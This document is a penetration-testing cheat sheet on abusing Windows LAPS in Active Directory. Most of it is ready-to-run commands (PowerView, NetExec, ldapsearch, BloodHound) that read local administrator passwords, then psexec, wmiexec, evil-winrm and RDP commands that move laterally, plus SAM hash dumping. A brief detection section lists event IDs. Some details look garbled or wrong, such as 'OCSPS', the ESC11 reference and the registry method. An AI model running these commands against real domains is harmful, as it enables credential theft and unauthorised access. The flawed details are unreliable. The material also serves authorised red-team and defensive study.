# LAPS Privilege Escalation

## Overview

**Windows LAPS** (Local Administrator Password Solution) manages local administrator passwords on domain-joined computers. Passwords are stored in AD attributes on the computer object (`ms-Mcs-AdmPwd` for legacy LAPS, or newer attributes in Windows LAPS). By default, only computers and Domain Admins can read these passwords — but misconfigured ACLs may grant additional users read access.

LAPS is a replacement for using the same local admin password across all machines. Compromising LAPS passwords allows lateral movement to any machine where you can read its LAPS password.

**Legacy LAPS**: Uses `ms-Mcs-AdmPwd` attribute, deployed via the LAPS tool (Microsoft)
**Windows LAPS** (2023+): Uses `msLAPS-Password` attribute, built into Windows

## Finding LAPS Targets

### Checking if LAPS is Deployed

```powershell
# Check if LAPS schema extensions exist (ms-Mcs-AdmPwd attribute)
Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-Mcs-AdmPwd

# Check LAPS schema attribute
Get-DomainObject -Identity "CN=Schema,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(name=ms-Mcs-AdmPwd)"

# Windows LAPS (newer)
Get-DomainObject -Identity "DC=domain,DC=local" -Properties msLAPS-Password

# AD Module
Get-ADObject -Filter "objectClass -eq 'attributeSchema' -and name -like '*LAPS*'" -SearchBase (Get-ADRootDSE).SchemaNamingContext
```

### Find Computers with LAPS Enabled

```powershell
# PowerView - computers with LAPS
Get-DomainComputer -LDAPFilter "(ms-Mcs-AdmPwdExpirationTime=*)" -Properties dnshostname,ms-Mcs-AdmPwdExpirationTime,ms-Mcs-AdmPwd

# Windows LAPS
Get-DomainComputer -LDAPFilter "(msLAPS-PasswordExpirationTime=*)" -Properties dnshostname,msLAPS-Password,msLAPS-PasswordExpirationTime

# AD Module
Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -like '*'" -Properties ms-Mcs-AdmPwdExpirationTime,ms-Mcs-AdmPwd

# Count LAPS-enabled machines
(Get-DomainComputer -LDAPFilter "(ms-Mcs-AdmPwdExpirationTime=*)").Count

# BloodHound
MATCH (c:Computer {haslaps:true}) RETURN c.name

# NetExec
nxc ldap dc01 -u user -p pass -M laps
```

### Check Who Can Read LAPS Passwords

```powershell
# Check ACLs on a specific computer for LAPS read permissions
Get-DomainObjectAcl -Identity "CN=TARGETPC,OU=Computers,DC=domain,DC=local" -ResolveGUIDs | ? {
  $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -or
  $_.ObjectAceType -eq "msLAPS-Password"
}

# Resolve the SID of principals who can read
Get-DomainObjectAcl -Identity "CN=TARGETPC,OU=Computers,DC=domain,DC=local" -ResolveGUIDs | ? {
  $_.ObjectAceType -like "*AdmPwd*"
} | % { ConvertFrom-SID $_.SecurityIdentifier }

# Find which users can read LAPS for which computers
# PowerView - not built-in, use BloodHound

# BloodHound
MATCH (u:User)-[r:ReadLAPSPassword]->(c:Computer) RETURN u.name, c.name
MATCH (g:Group)-[r:ReadLAPSPassword]->(c:Computer) RETURN g.name, c.name

# NetExec - LAPS module shows readable machines
nxc ldap dc01 -u user -p pass -M laps -o COMPUTER=TARGETPC
```

## Reading LAPS Passwords

### PowerView (Legacy LAPS)

```powershell
# Get LAPS password for a specific computer (requires read access)
Get-DomainComputer -Identity TARGETPC -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Get LAPS passwords for all computers (if you have rights)
Get-DomainComputer -LDAPFilter "(ms-Mcs-AdmPwdExpirationTime=*)" -Properties dnshostname,ms-Mcs-AdmPwd

# Using Get-LAPSPassword function from PowerView
# (if included in your version)
```

### AD Module (Legacy LAPS)

```powershell
# AD Module - requires the LAPS PowerShell module
Import-Module AdmPwd.PS
Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -like '*'" -Properties ms-Mcs-AdmPwdExpirationTime,ms-Mcs-AdmPwd,Name
```

### NetExec

```bash
# Read LAPS passwords via LDAP
nxc ldap dc01.domain.local -u user -p pass -M laps

# Read LAPS for specific computer
nxc ldap dc01.domain.local -u user -p pass -M laps -o COMPUTER=TARGETPC

# Read LAPS using SMB
nxc smb targetpc.domain.local -u user -p pass -M laps
```

### CrackMapExec (Legacy)

```bash
# Read LAPS passwords
cme ldap dc01 -u user -p pass -M laps

# Reading from a specific computer
cme smb targetpc -u user -p pass -M laps
```

### Manual LDAP

```bash
# Using ldapsearch
ldapsearch -H ldap://dc01 -D "user@domain.local" -w "pass" -b "DC=domain,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" ms-Mcs-AdmPwd dnshostname

# Windows LAPS
ldapsearch -H ldap://dc01 -D "user@domain.local" -w "pass" -b "DC=domain,DC=local" "(msLAPS-PasswordExpirationTime=*)" msLAPS-Password
```

### Python (impacket)

```bash
# Using ldapdomaindump or custom ldapquery
python3 ldapsearch.py -d domain.local -u user -p pass -t ldap -s dc01 "(ms-Mcs-AdmPwdExpirationTime=*)" ms-Mcs-AdmPwd
```

## Exploitation — Using LAPS Passwords

```powershell
# Once you have the local admin password:

# Remote Desktop
xfreerdp /v:targetpc /u:Administrator /p:'LAPS_password'

# SMB / PsExec
python3 psexec.py domain/Administrator:'LAPS_password'@targetpc

# WinRM
evil-winrm -i targetpc -u Administrator -p 'LAPS_password'

# WMI
python3 wmiexec.py domain/Administrator:'LAPS_password'@targetpc

# NetExec
nxc smb targetpc -u Administrator -p 'LAPS_password' -M svd
nxc smb targetpc -u Administrator -p 'LAPS_password' -x whoami
nxc smb targetpc -u Administrator -p 'LAPS_password' --sam
```

## Reading LAPS via SMB (Alternative)

```bash
# If you can't read LAPS via LDAP but have local admin on a machine
# that has the LAPS client installed, the password may be stored locally
# in the registry

# Check registry on a domain-joined machine
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\LAPS\State" /v Password
```

## OPSEC Considerations

- **Reading LAPS via LDAP** generates Event ID 4662 (Directory Service Access) on the computer object's `ms-Mcs-AdmPwd` attribute
- **Bulk LAPS reading** (e.g., `Get-DomainComputer *)` is noisy and generates many 4662 events
- **LAPS password expiration**: Passwords rotate on a schedule (default: 30 days, or configurable)
- **Old passwords**: LAPS does not store historical passwords; you get the current password
- **OCSPS**: LAPS ACLs should only grant read to `Domain Admins` and the computer itself
- **Detection**: LAPS reads on many machines in a short period is a strong indicator of compromise

## Detection

| Event ID | Description |
|----------|-------------|
| 4662 | Directory Service Access (reading ms-Mcs-AdmPwd) |
| 4662 | Directory Service Access (reading msLAPS-Password) |
| 5140 | SMB share access (if logging) |
| 4625 | Logon failure (incorrect LAPS password) |

### Blue Team Detection

```powershell
# Monitor for bulk LAPS reads
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4662} |
  Where-Object { $_.Properties[3].Value -like "*ms-Mcs-AdmPwd*" } |
  Group-Object { $_.Properties[1].Value } |
  Where-Object Count -gt 10

# Alert on LAPS password reads by non-admin users
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4662} |
  Where-Object { $_.Properties[3].Value -like "*AdmPwd*" -and
    $_.Properties[1].Value -notlike "*Domain Admins*" }
```

## LAPS + ADCS (ESC11)

If LAPS is not available but ADCS is misconfigured, you may be able to use the machine's computer certificate to authenticate, which can lead to reading LAPS passwords. See the ADCS attacks section for details.

## Windows LAPS vs Legacy LAPS

| Feature | Legacy LAPS | Windows LAPS (2023+) |
|---------|-------------|----------------------|
| Attribute | ms-Mcs-AdmPwd | msLAPS-Password |
| Password rotation | Group Policy | Built-in |
| DSRM password | No | Optional |
| Encrypted | No (clear text in AD) | Encrypted |
| Management tool | AdmPwd.PS / LAPS UI | Built-in Windows |
| Client | LAPS client install | Built-in (Win 10 22H2+/Server 2022+) |

## LAPS Misconfigurations to Check

### 1. Delegated LAPS Read Access

```powershell
# If a user or group has been delegated read access to LAPS passwords
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" }
```

### 2. LAPS Not Enforced

```powershell
# If LAPS is installed but not enforced on some machines
# Check for computers without LAPS expiration
Get-DomainComputer -LDAPFilter "(!(ms-Mcs-AdmPwdExpirationTime=*))"
```

### 3. LAPS + GenericAll/GenericWrite

```powershell
# If you have GenericAll/GenericWrite on a computer, you can't read LAPS directly
# but you can modify the ms-Mcs-AdmPwd attribute or use RBCD instead
```

## Quick Reference

```powershell
# Check if LAPS is deployed
Get-DomainComputer -LDAPFilter "(ms-Mcs-AdmPwdExpirationTime=*)" -Properties dnshostname | select -First 5

# Read LAPS password for a specific computer
Get-DomainComputer -Identity TARGETPC -Properties ms-Mcs-AdmPwd

# Read all LAPS passwords (if permissions allow)
Get-DomainComputer -LDAPFilter "(ms-Mcs-AdmPwdExpirationTime=*)" -Properties dnshostname,ms-Mcs-AdmPwd

# Check who can read LAPS
Get-DomainObjectAcl -Identity "CN=TARGETPC,OU=Computers,DC=domain,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" }

# NetExec LAPS
nxc ldap dc01 -u user -p pass -M laps

# BloodHound LAPS query
MATCH (u:User)-[r:ReadLAPSPassword]->(c:Computer) RETURN u.name, c.name

# Use LAPS password
nxc smb targetpc -u Administrator -p 'LAPS_password'
xfreerdp /v:targetpc /u:Administrator /p:'LAPS_password'
python3 wmiexec.py domain/Administrator:'LAPS_password'@targetpc
```
